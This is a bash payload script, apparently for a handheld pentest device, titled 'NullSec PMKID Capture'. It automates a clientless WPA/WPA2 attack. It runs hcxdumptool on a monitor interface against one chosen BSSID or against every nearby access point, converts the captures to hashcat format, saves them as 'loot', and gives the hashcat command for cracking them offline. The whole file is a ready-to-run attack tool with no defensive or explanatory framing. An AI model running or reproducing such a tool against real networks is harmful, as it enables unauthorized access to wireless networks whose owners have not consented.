#!/bin/bash
# Title: NullSec PMKID Capture
# Author: bad-antics
# Description: Clientless WPA attack via PMKID harvesting
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR"/{pmkid,logs}

PROMPT "NULLSEC PMKID CAPTURE

Clientless WPA/WPA2 attack.
Captures PMKID from AP without
needing active clients.

Works on many routers!

Press OK to configure."

MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

# Check for hcxdumptool
if ! command -v hcxdumptool >/dev/null 2>&1; then
    ERROR_DIALOG "hcxdumptool not installed!

Install with:
opkg install hcxdumptool"
    exit 1
fi

DURATION=$(NUMBER_PICKER "Capture duration (seconds):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac
[ $DURATION -lt 30 ] && DURATION=30
[ $DURATION -gt 600 ] && DURATION=600

# Target specific or all?
resp=$(CONFIRMATION_DIALOG "Target specific network?

YES = enter BSSID
NO = capture all PMKIDs")

TARGET_BSSID=""
if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    TARGET_BSSID=$(MAC_PICKER "Enter target BSSID:" "00:00:00:00:00:00")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TARGET_BSSID="" ;; esac
fi

resp=$(CONFIRMATION_DIALOG "Start PMKID capture?

Interface: $MONITOR_IF
Duration: ${DURATION}s
Target: $([ -n "$TARGET_BSSID" ] && echo "$TARGET_BSSID" || echo "ALL")")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# Capture
LOG "Starting PMKID capture..."
OUTFILE="$LOOT_DIR/pmkid/capture_$(date +%Y%m%d_%H%M%S)"

OPTS="-i $MONITOR_IF -o ${OUTFILE}.pcapng --enable_status=1"
[ -n "$TARGET_BSSID" ] && OPTS="$OPTS --filterlist_ap=$TARGET_BSSID --filtermode=2"

timeout $DURATION hcxdumptool $OPTS 2>/dev/null

# Convert to hashcat format
if command -v hcxpcapngtool >/dev/null 2>&1; then
    hcxpcapngtool -o "${OUTFILE}.22000" "${OUTFILE}.pcapng" 2>/dev/null
fi

# Count results
PMKID_COUNT=0
[ -f "${OUTFILE}.22000" ] && PMKID_COUNT=$(wc -l < "${OUTFILE}.22000")

PROMPT "PMKID CAPTURE COMPLETE

PMKIDs captured: $PMKID_COUNT

Files saved:
${OUTFILE}.pcapng
${OUTFILE}.22000

Crack with hashcat:
hashcat -m 22000 file.22000 wordlist.txt"
